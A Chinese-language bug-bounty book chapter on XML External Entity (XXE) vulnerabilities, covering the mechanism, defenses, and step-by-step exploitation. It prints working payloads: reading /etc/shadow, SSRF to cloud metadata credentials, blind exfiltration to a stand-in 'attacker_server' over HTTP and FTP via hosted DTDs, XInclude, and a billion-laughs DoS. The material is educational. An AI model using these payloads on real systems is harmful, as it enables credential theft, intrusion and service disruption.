# 第15章：XML外部实体（XML External Entity）

XML外部实体攻击（XXE）是令人着迷的漏洞，它们针对应用程序的XML解析器。XXE可能是影响巨大的漏洞，因为它们可能导致机密信息泄露、SSRF和DoS攻击。但它们也难以理解和利用。

在本章中，我们将深入探讨XXE的来龙去脉，以便你能够在实际环境中找到一个。我们还将讨论如何使用XXE提取目标系统上的敏感文件、发起SSRF和触发DoS攻击。

## 机制

可扩展标记语言（XML）是为存储和传输数据而设计的。这种标记语言允许开发人员使用类似于HTML的树状结构，以文本格式定义和表示任意数据结构。例如，Web应用程序通常使用XML在安全断言标记语言（SAML）身份验证中传输身份信息。XML可能如下所示：

```xml
<saml:AttributeStatement>
  <saml:Attribute Name="username">
    <saml:AttributeValue>
      vickieli
    </saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

注意，与HTML不同，XML具有用户定义的标签名称，让你可以自由地结构化XML文档。XML格式广泛用于Web应用程序的各种功能中，包括身份验证、文件传输和图像上传，或仅用于从客户端到服务器之间传输HTTP数据。

XML文档可以包含**文档类型定义（DTD）**，它定义了XML文档的结构及其包含的数据。这些DTD可以从外部源加载，也可以在文档本身的`DOCTYPE`标签中声明。例如，这是一个定义名为`file`的XML实体的DTD：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file "Hello!">
]>
<example>&file;</example>
```

XML实体的工作方式类似于编程语言中的变量：每当你使用`&file;`语法引用此实体时，XML文档将在其位置加载`file`的值。在这种情况下，XML文档中对`&file;`的任何引用都将被替换为`"Hello!"`。

XML文档还可以使用外部实体通过URL访问本地或远程内容。如果实体的值前面带有`SYSTEM`关键字，则该实体是外部实体，其值将从URL加载。你可以看到，以下DTD声明了一个名为`file`的外部实体，`file`的值是本地文件系统上`file:///example.txt`的内容：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "file:///example.txt">
]>
<example>&file;</example>
```

最后一行在XML文档中加载了`file`实体，引用了位于`file:///example.txt`的文本文件内容。

外部实体也可以从互联网加载资源。此DTD声明了一个名为`file`的外部实体，指向example.com的首页：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "http://example.com/index.html">
]>
<example>&file;</example>
```

此功能中隐藏的漏洞是什么？问题在于，如果用户可以控制XML实体或外部实体的值，他们可能能够泄露内部文件、对内部机器进行端口扫描或发起DoS攻击。

许多站点使用较旧或配置不当的XML解析器来读取XML文档。如果解析器允许用户定义的DTD或DTD中的用户输入，并且配置为解析和评估DTD，攻击者可以声明自己的外部实体以达到恶意结果。

例如，假设一个Web应用程序允许用户上传自己的XML文档。应用程序将解析文档并将其显示回给用户。恶意用户可以上传如下文档来读取服务器上的`/etc/shadow`文件，这是Unix系统存储用户名及其加密密码的地方：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  ① <!ENTITY file SYSTEM "file:///etc/shadow">
]>
<example>&file;</example>
```

解析此XML文件将导致服务器返回`/etc/shadow`的内容，因为XML文件通过外部实体①包含了`/etc/shadow`。

这类攻击称为**XML外部实体攻击**，或XXE。当应用程序接受用户提供的XML输入或将用户输入传递到DTD中，然后由XML解析器解析，并且该XML解析器读取本地系统文件或发送DTD中指定的内部或出站请求时，应用程序就容易受到XXE攻击。

## 防御措施

防止XXE的关键在于限制XML解析器的功能。

首先，由于DTD处理是XXE攻击的要求，你应该尽可能在XML解析器上**禁用DTD处理**。如果无法完全禁用DTD，你可以禁用外部实体、参数实体（参见第254页的“提升攻击影响”）和内联DTD（包含在XML文档中的DTD）。并且为了防止基于XXE的DoS，你可以限制XML解析器的解析时间和解析深度。你还可以完全禁用实体的展开。

禁用DTD处理和配置解析器行为的机制取决于所使用的XML解析器。例如，如果你使用默认的PHP XML解析器，你需要将`libxml_disable_entity_loader`设置为`TRUE`以禁用外部实体的使用。有关如何为你的解析器执行的更多信息，请查阅OWASP速查表：https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md。

你可以采取的另一条路径是**输入验证**。你可以为传递给XML文档的用户提供值创建白名单，或清理XML文档、头或节点中潜在的主机数据。

另外，你可以尽可能使用JSON等较简单的数据格式代替XML。

在经典XXE中（如我在“机制”部分第249页展示的示例），攻击者通过使应用程序在HTTP响应中返回数据来窃取数据。如果服务器接受XML输入但不在HTTP响应中返回XML文档，攻击者可以改用盲XXE来窃取数据。盲XXE通过让目标服务器向攻击者服务器发送带有被盗数据的出站请求来窃取数据。为了防止盲XXE，你可以**禁止出站网络流量**。

最后，你可以定期审查源代码以检测和修复XXE漏洞。由于许多XXE是由应用程序的依赖项而非其自定义源代码引入的，你应该保持应用程序或底层操作系统使用的所有依赖项为最新。

## 寻找XXE

要找到XXE，首先定位容易出现XXE的功能。这包括应用程序接收直接XML输入的任何地方，或接收被插入到应用程序解析的XML文档中的输入的任何地方。

### 第1步：找到XML数据入口点

许多应用程序使用XML数据在HTTP消息中传输信息。要查找这些端点，你可以打开代理并浏览目标应用程序。然后，通过查找前面提到的树状结构，或通过查找XML文档的特征——字符串`"<?xml"`，在HTTP消息中找到类似XML的文档。

同时注意应用程序中编码的XML数据。有时应用程序使用base64或URL编码的XML数据以便于传输。你可以通过解码任何看起来可疑的数据块来找到这些XML入口点。例如，XML代码的base64编码块往往以`LD94bWw`开头，这是`"<?xml"`的base64编码字符串。

除了在HTTP消息中搜索XML，你还应该查找文件上传功能。这是因为XML是许多常见文件类型的基础。如果你能上传其中一种文件类型，你可能能够将XML输入偷偷传递给应用程序的XML解析器。XML可以写入文档和图像格式，如XML、HTML、DOCX、PPTX、XLSX、GPX、PDF、SVG和RSS源。此外，嵌入在GIF、PNG和JPEG等图像中的元数据都基于XML。SOAP Web服务也基于XML。我们将在第24章更详细地讨论SOAP。

除了查找应用程序默认接受XML数据的位置，你还可以尝试强制应用程序解析XML数据。有时端点默认接受纯文本或JSON输入，但也可以处理XML输入。在接受其他格式输入的端点上，你可以将请求的`Content-Type`头修改为以下头之一：

```
Content-Type: text/xml
Content-Type: application/xml
```

然后，尝试在请求体中包含XML数据。有时，这就是让目标应用程序解析你的XML输入所需的全部操作。

最后，一些应用程序接收用户提交的数据，并在服务器端将其嵌入XML文档中。如果你怀疑发生这种情况，你可以向端点提交一个XInclude测试载荷，我将在步骤5中介绍。

### 第2步：测试经典XXE

一旦确定端点可用于提交XML数据，你就可以开始测试XXE攻击所需功能的存在。这通常涉及发送一些试错XXE载荷并观察应用程序的响应。

如果应用程序从解析器返回结果，你可能能够执行经典XXE攻击——也就是说，你可以直接从服务器响应中读取泄露的文件。要搜索经典XXE，首先通过将XML实体插入XML输入并查看其是否正确加载来检查XML实体是否被解释：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "Hello!">
]>
<example>&test;</example>
```

然后，通过尝试加载本地文件来测试`SYSTEM`关键字是否可用：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "file:///etc/hostname">
]>
<example>&test;</example>
```

当`SYSTEM`关键字不起作用时，你可以用`PUBLIC`关键字替换它。此标签要求你在`PUBLIC`关键字后提供带引号的ID。解析器使用它来为实体的值生成备用URL。出于我们的目的，你可以只使用一个随机字符串代替：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test PUBLIC "abc" "file:///etc/hostname">
]>
<example>&test;</example>
```

接下来，尝试提取一些常见的系统文件。例如，你可以从`/etc/hostname`和`/etc/passwd`开始。我喜欢使用XXE提取的另一个文件是`.bash_history`。此文件通常位于每个用户的主目录（`~/.bash_history`）中，包含先前执行的命令列表。通过读取此文件，你通常可以发现内部URL、IP地址和文件位置等有价值的信息。这里提到的常见系统文件或路径可能受限，所以如果前几个你尝试读取的文件没有显示，不要放弃。

### 第3步：测试盲XXE

如果服务器接受XML输入但不在HTTP响应中返回XML文档，你可以改为测试盲XXE。大多数盲XXE攻击不是从服务器响应中读取文件，而是通过让目标服务器向攻击者服务器发送带有窃取信息的请求来窃取数据。

首先，你需要通过让目标向你自己的服务器发出请求来确保服务器可以建立出站连接。你可以按照第13章的说明设置回调监听器。设置监听器以发现XXE的过程与设置为发现SSRF的过程相同。尝试让外部实体加载你机器上的资源。为了绕过常见的防火墙限制，你应该首先测试80和443端口，因为目标防火墙可能不允许其他端口上的出站连接：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "http://attacker_server:80/xxe_test.txt">
]>
<example>&test;</example>
```

然后你可以搜索服务器的访问日志，查找对该特定文件的请求。在这种情况下，你将查找对`xxe_test.txt`文件的GET请求。一旦确认服务器可以发出出站请求，你就可以使用后续部分介绍的技术尝试窃取文件。

### 第4步：在不同文件类型中嵌入XXE载荷

除了在HTTP请求体上测试XXE，你还可以尝试将包含XXE载荷的文件上传到服务器。文件上传端点和文件解析器通常不受与常规端点相同的XXE保护机制保护。而且，将XXE载荷隐藏在不同文件类型中意味着即使应用程序限制可上传的文件类型，你也能够上传载荷。

本节仅提供几个如何在各种文件类型中嵌入XXE载荷的示例。你应该能够在互联网上搜索到更多示例。

要在SVG图像中嵌入XXE载荷，你首先需要将图像作为文本文件打开。以这个蓝色圆圈的SVG图像为例：

```svg
<svg width="500" height="500">
  <circle cx="50" cy="50" r="40" fill="blue" />
</svg>
```

通过直接在文件中添加DTD并在SVG图像中引用外部实体来插入XXE载荷。然后你可以将文件保存为`.svg`文件并上传到服务器：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "file:///etc/shadow">
]>
<svg width="500" height="500">
  <circle cx="50" cy="50" r="40" fill="blue" />
  <text font-size="16" x="0" y="16">&test;</text>
</svg>
```

Microsoft Word文档（`.docx`文件）、PowerPoint演示文稿（`.pptx`）和Excel工作表（`.xlxs`）是包含XML文件的归档文件，因此你也可以将XXE载荷插入其中。为此，你应该首先解压文档文件。例如，我在Mac上使用Unarchiver软件提取文件。你应该会看到一些包含XML文件的文件夹（图15-1）。

*（图15-1：当你解压DOCX文件时，你会看到一些包含XML文件的文件夹。）*

然后你可以简单地将载荷插入`/word/document.xml`、`/ppt/presentation.xml`或`/xl/workbook.xml`中。最后，将归档文件重新打包为`.docx`、`.pptx`或`.xlxs`格式。

你可以通过`cd`进入解压的文件夹并运行命令`zip -r filename.format *`来完成此操作。`zip`命令行实用程序用于归档文件。`-r`选项告诉`zip`递归归档目录中的文件，`filename.format`告诉`zip`归档文件的名称应该是什么，`*`告诉`zip`归档当前目录中的所有文件。在这种情况下，你可以运行以下命令创建一个新的DOCX文件：

```bash
cd example
zip -r new_example.docx *
```

你应该会在当前目录中看到重新打包的文档。

### 第5步：测试XInclude攻击

有时你无法控制整个XML文档或编辑XML文档的DTD。但如果目标应用程序接受你的用户输入并将其插入后端的XML文档中，你仍然可以利用XXE漏洞。

在这种情况下，你可能能够执行**XInclude攻击**。XInclude是一种特殊的XML功能，它从名为`xi:include`的单个XML标签构建单独的XML文档。如果你甚至能控制传递给XML文档的单个未清理数据，你可能能够在该值中放置XInclude攻击。

要测试XInclude攻击，将以下载荷插入数据入口点，查看你请求的文件是否在响应体中返回：

```xml
<example xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</example>
```

这段XML代码做了两件事。首先，它引用了`http://www.w3.org/2001/XInclude`命名空间，以便我们可以使用`xi:include`元素。接下来，它使用该元素解析并在XML文档中包含`/etc/hostname`文件。

## 提升攻击影响

通过XXE漏洞能实现什么取决于赋予XML解析器的权限。通常，你可以使用XXE来访问和窃取本地机器上的系统文件、源代码和目录列表。你也可以使用XXE执行SSRF攻击，对目标网络进行端口扫描、读取网络上的文件，以及访问隐藏在防火墙后面的资源。最后，攻击者有时使用XXE发起DoS攻击。

### 读取文件

要使用XXE漏洞读取本地文件，将本地文件的路径放入被解析XML文件的DTD中。可以使用`file://` URL方案后跟机器上的文件路径来访问本地文件。此载荷将使XML解析器返回服务器上`/etc/shadow`文件的内容：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "file:///etc/shadow">
]>
<example>&file;</example>
```

### 发起SSRF

除了检索系统文件，你还可以使用XXE漏洞对本地网络发起SSRF攻击。例如，你可以通过切换外部实体URL中目标机器的不同端口来发起端口扫描。这与第13章提到的端口扫描技术类似，你可以通过分析服务器响应的差异来确定端口状态：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "http://10.0.0.1:80">
]>
<example>&file;</example>
```

你也可以使用XXE发起SSRF以获取实例元数据，正如我们在第13章中讨论的。此载荷将使解析器返回AWS元数据：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<example>&file;</example>
```

在尝试查看此类非预期数据时，你应该通过检查页面源代码（右键点击页面并选择“查看源代码”）或直接检查HTTP响应来查找窃取的数据，而不是查看浏览器渲染的HTML页面，因为浏览器可能无法正确渲染页面。

当然，基于XXE的SSRF能做的不仅限于网络扫描和检索实例元数据。你也可以使用收集到的信息渗透到内部服务中。有关如何利用SSRF的更多想法，请访问第13章。

### 使用盲XXE

有时应用程序不向用户返回XML解析的结果。在这种情况下，你仍然可以通过强制XML解析器向你的服务器发出带有目标数据的出站请求来将数据窃取到你控制的服务器——即前面提到的盲XXE攻击。然后你可以监控服务器日志以检索窃取的数据。

此时，你可能认为盲XXE的载荷看起来像这样：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY file SYSTEM "file:///etc/shadow">
  <!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file;">
]>
<example>&exfiltrate;</example>
```

此载荷旨在通过向攻击者服务器发送请求，将`/etc/shadow`文件的内容作为URL参数来窃取它。载荷首先定义一个包含本地`/etc/shadow`文件内容的外部实体`file`。然后向攻击者服务器发出请求，在请求的URL参数中包含该文件的内容。

然而，这种攻击可能不会成功，因为大多数解析器不允许外部实体包含在其他外部实体中。解析器一旦遇到`<!ENTITY exfiltrate SYSTEM "http://attacker_server/?&file;">`这行就会停止处理DTD。因此，使用盲XXE窃取数据比经典XXE要复杂一些。

幸运的是，XML DTD有一个名为**参数实体**的功能，我们可以改用。参数实体是只能在DTD内其他位置引用的XML实体。它们使用百分号（`%`）字符声明和引用。例如，我之前介绍的盲XXE载荷可以重写如下：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY % file SYSTEM "file:///etc/shadow"> ①
  <!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>"> ②
  %ent;
  %exfiltrate;
]>
```

此DTD首先声明一个名为`file`的参数实体，包含`/etc/shadow`的文件内容①。然后它声明一个名为`ent`的参数实体，包含另一个名为`exfiltrate`的参数实体的动态声明②。`&#x25;`是百分号（`%`）的十六进制编码版本。根据目标的不同，动态声明中的特殊字符有时需要十六进制编码。`exfiltrate`实体指向攻击者服务器，URL参数中包含`/etc/shadow`的内容。

最后，DTD引用`ent`来声明`exfiltrate`实体，然后引用`exfiltrate`来触发外部请求。

但如果你尝试将此载荷上传到目标，你可能会注意到它不起作用。这是因为根据XML规范，参数实体在内联DTD（XML文档中`DOCTYPE`标签内指定的DTD）和外部DTD（托管在其他地方的单独DTD）中的处理方式不同。在内联DTD中，参数实体不能在标记中引用，因此这行不起作用：`<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>`，而在外部DTD中，不存在此类限制。

要通过盲XXE窃取数据，你必须通过在你的服务器上托管外部DTD来克服此限制。尝试在你的服务器上托管一个名为`xxe.dtd`的文件：

```xml
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">
%ent;
%exfiltrate;
```

然后通过在一个参数实体中指定外部DTD并引用该实体来使目标解析器解释你的DTD：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
  %xxe;
]>
```

这样，目标服务器将解析提交的XML文件，并注意到一个参数实体引用了外部文件。然后目标服务器将检索并解析该外部DTD，因此你的载荷将执行，目标将向你发送回窃取的数据。在这里，我们将`/etc/shadow`文件的内容作为URL参数窃取到攻击者服务器的请求中。

注意，在这次攻击中，我们只使用了参数实体，根本没有使用外部实体！如果解析器阻止外部实体或限制实体引用以防御XXE，你也可以使用此技术。然而，此策略只能窃取目标文件的单行，因为目标文件中的换行符（`\n`）会中断外部URL，甚至可能导致HTTP请求失败。

一种更简单的通过盲XXE窃取数据的方法是强制解析器返回描述性错误消息。例如，你可以通过引用一个不存在的文件作为外部实体的值来诱导“文件未找到”错误。你的外部DTD可以重写如下：

```xml
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/?%file;'>">
%ent;
%error;
```

注意我将`/etc/shadow`的内容包含在不存在文件路径的URL参数中。然后你可以向目标提交相同的载荷来触发攻击：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
  %xxe;
]>
```

此恶意DTD将导致解析器将所需文件内容作为“文件未找到”错误传递：

```
java.io.FileNotFoundException: file:///nonexistent/FILE CONTENTS OF /etc/shadow
```

### 执行拒绝服务攻击

攻击者利用XML漏洞的另一种潜在方式是发起拒绝服务攻击，这会扰乱机器，使合法用户无法访问其服务。请注意，**你绝不应该在真实目标上尝试此操作！** 在真实目标上测试DoS可能给组织造成经济损失，通常违反公司的漏洞赏金政策：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ELEMENT example ANY>
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<example>&lol9;</example>
```

此载荷在实体中嵌入实体，导致XML解析器递归解引用实体以到达根实体值`lol`。每个`lol9`实体将被展开为10个`lol8`值，每个`lol8`值将变为10个`lol7`，依此类推。最终，单个`lol9`将被展开为十亿个`lol`。这将使XML解析器的内存超载，可能导致其崩溃。

此攻击方法也称为**十亿 laughs 攻击**或**XML炸弹**。这里的示例取自维基百科，你可以在其中阅读更多关于该攻击的信息：https://en.wikipedia.org/wiki/Billion_laughs_attack。有趣的是，虽然这种攻击通常被归类为XXE攻击，但它根本不涉及使用任何外部实体！

### 更多关于使用XXE的数据窃取

如果解析器针对XXE攻击进行了加固，并且你试图读取特定格式的文件，XXE数据窃取会变得更加复杂。但总有更多方法来绕过限制！

有时你会想要窃取包含XML特殊字符的文件，如尖括号（`<>`）、引号（`"`或`'`）和与符号（`&`）。通过XXE直接访问这些文件会破坏DTD的语法并干扰窃取。幸运的是，XML已经有一个处理此问题的功能。在XML文件中，包裹在CDATA（字符数据）标签内的字符不被视为特殊字符。因此，例如，如果你正在窃取一个XML文件，你可以将恶意外部DTD重写如下：

```xml
① <!ENTITY % file SYSTEM "file:///passwords.xml">
② <!ENTITY % start "<![CDATA[">
③ <!ENTITY % end "]]>">
④ <!ENTITY % ent "<!ENTITY &#x25; exfiltrate
'http://attacker_server/?%start;%file;%end;'>">
%ent;
%exfiltrate;
```

此DTD首先声明一个指向你要读取的文件的参数实体①。它还声明了两个包含字符串`"<![CDATA["`和`"]]>"`的参数实体②③。然后它通过将文件内容包裹在`CDATA`标签中构造一个不会破坏DTD语法的窃取URL④。连接后的`exfiltrate`实体声明将变为：

```
<!ENTITY % exfiltrate 'http://attacker_server/?<![CDATA[CONTENTS_OF_THE_FILE]]>'>
```

你可以看到我们的载荷正在迅速变得复杂。为防止意外将语法错误引入载荷，你可以使用XmlLint（https://xmllint.com/）等工具来确保XML语法有效。

最后，将你常用的XML载荷发送到目标以执行攻击：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
  %xxe;
]>
```

另一种窃取包含特殊字符的文件的方法是使用PHP URL包装器。如果目标是基于PHP的应用程序，PHP包装器允许你将所需数据转换为base64格式，以便你可以使用它读取XML文件甚至二进制文件：

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">
%ent;
%exfiltrate;
```

文件传输协议（FTP）也可用于直接发送数据，同时绕过特殊字符限制。HTTP有许多特殊字符限制，通常限制URL的长度。改用FTP是绕过它的简单方法。要使用它，你需要在你机器上运行一个简单的FTP服务器，并相应地修改你的恶意DTD。我使用了https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb上的简单Ruby服务器脚本：

```xml
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM
① 'ftp://attacker_server:2121/?%file;'>">
%ent;
%exfiltrate;
```

我们这里使用2121端口，因为正在使用的Ruby FTP服务器运行在2121端口，但正确的端口取决于你如何运行服务器①。

## 找到你的第一个XXE！

现在你已了解XXE攻击的基础知识，尝试在真实目标上找到你自己的XXE漏洞。按照本章介绍的步骤最大化成功的机会：

1. **找到可用于提交XML数据的数据入口点**。
2. **确定入口点是经典XXE还是盲XXE的候选**。如果端点在HTTP响应中返回解析后的XML数据，则可能容易受到经典XXE攻击。如果端点不返回结果，它可能仍然容易受到盲XXE攻击，你应该为测试设置回调监听器。
3. **尝试一些测试载荷**，查看解析器是否配置不当。在经典XXE的情况下，你可以检查解析器是否处理外部实体。在盲XXE的情况下，你可以让服务器向你的回调监听器发送请求，查看你能否触发外部交互。
4. **如果XML解析器具有使其容易受到XXE攻击的功能**，尝试窃取一个常见的系统文件，如`/etc/hostname`。
5. **你也可以尝试检索一些更敏感的系统文件**，如`/etc/shadow`或`~/.bash_history`。
6. **如果你无法使用简单的XXE载荷窃取整个文件**，尝试使用替代的数据窃取方法。
7. **看看你是否可以使用XXE发起SSRF攻击**。
8. **起草你的第一份XXE报告并发送给公司！**
